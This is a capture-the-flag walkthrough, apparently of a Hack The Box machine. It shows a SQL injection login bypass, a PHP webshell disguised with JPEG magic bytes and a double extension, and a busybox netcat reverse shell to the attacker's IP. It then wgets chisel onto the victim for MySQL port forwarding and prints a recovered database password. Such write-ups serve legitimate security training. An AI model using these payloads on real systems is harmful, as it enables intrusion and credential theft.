#### Foothold

I run `nmap` and find ports `22` and `80` open.

I visit the web-app at the ip address given and see it has images posted. There is a login page with a basic SQL injection vulnerability, in the username I enter `admin'-- -` and in the password I enter `pass`, but doesn't matter as it's commented out.

This get's me to the `/upload.php`, where I can upload a `jpg`, `jpeg` or `png` file. Images are saved in the directory `/images/uploads`.

Apache has a vulnerability, according to the Apache Documentation, files can have more than one extension.

While the order is normally irrelevant. When a file with multiple extensions gets associated with both a media-type and a handler, it will result in the request being handled by the module associated with the handler. For example, let's say that we have the file test.php.jpg with the .php extension mapped to the handler application/x-httpd-php , and the .jpg extension mapped to the image/jpeg media-type. Then, the application/x-httpd-php handler will be used and it will be treated as an php file.

So i create a file called `webshell.php.jpg` that will be accepted by the `.jpg` check, but runs php code.

I create a php shell to upload, the first line enters 'magic bytes', which fools a server check that the file is a `jpeg/jpg`:

```
$ echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
$ echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
```

After the file is uploaded I run the following reverse shell in the web browser. Several other reverse shells were tried but did not work.

```
busybox nc 10.10.14.207 4444 -e /bin/bash
```

This is what I run in the web browser:

```
http://10.10.10.185/images/uploads/webshell.php.jpg?0=busybox nc 10.10.14.207 4444 -e /bin/bash
```

#### Lateral Movement



To get a better shell, I run the following command:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After enumerating the files in the victim's box I see credentials to `mysql`, but when I attempt to login to `mysql`, I see that the `mysql` client hasn't been downloaded.

I can download the `mysql` client locally and port forward `3306` to my local to run `mysql` commands there.

To port forward I want to run `chisel`, which I download a binary from here -> https://github.com/jpillora/chisel/releases. I decompress the binary and making it available via a webserver by running: 

```
$ gzip -d chisel_1.7.0-rc8_linux_amd64.gz
$ chmod +x chisel_1.7.0-rc8_linux_amd64
$ ./chisel_1.7.0-rc8_linux_amd64 server -p 8000 -reverse
$ python3 -m http.server
```

Then on the victim box I go to the `/tmp` directory, 
```
$ cd /tmp
$ wget http://10.10.14.7:8080/chisel_1.7.0-rc8_linux_amd64
$ ./chisel_1.7.0-rc8_linux_amd64 client 10.10.14.7:8000 R:3306:127.0.0.1:3306 &
```

Finally, locally I can access the database with mysql:

```
mysql -h 127.0.0.1 -P 3306 -u theseus -piamkingtheseus
```

After navigating the database I `select * from login`, and I get the password for the user `theseus`. I connect to `theseus` by running `su theseus`.

The user flag is located on `/home/theseus/user.txt`.

#### Privesc

Cannot change the cat script in `tmp` to add reverse shell. Stopping here...